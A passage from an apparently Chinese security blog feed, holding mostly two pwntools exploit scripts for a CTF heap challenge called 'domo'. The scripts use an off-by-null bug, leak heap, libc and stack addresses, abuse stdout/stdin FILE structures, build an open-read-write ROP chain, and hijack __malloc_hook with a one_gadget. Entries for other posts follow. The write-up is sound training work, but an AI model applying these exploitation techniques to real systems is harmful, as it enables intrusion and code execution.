class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python3 angr 学习笔记</title>
    <link href="https://nocbtm.github.io/2020/05/21/python3-angr-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nocbtm.github.io/2020/05/21/python3-angr-学习笔记/</id>
    <published>2020-05-21T08:44:17.000Z</published>
    <updated>2020-05-24T11:44:29.963Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-05-12T00:40:29.178Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19RUNvdmdCxVbO6QFu6BQcpaRUry9lZyZM= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
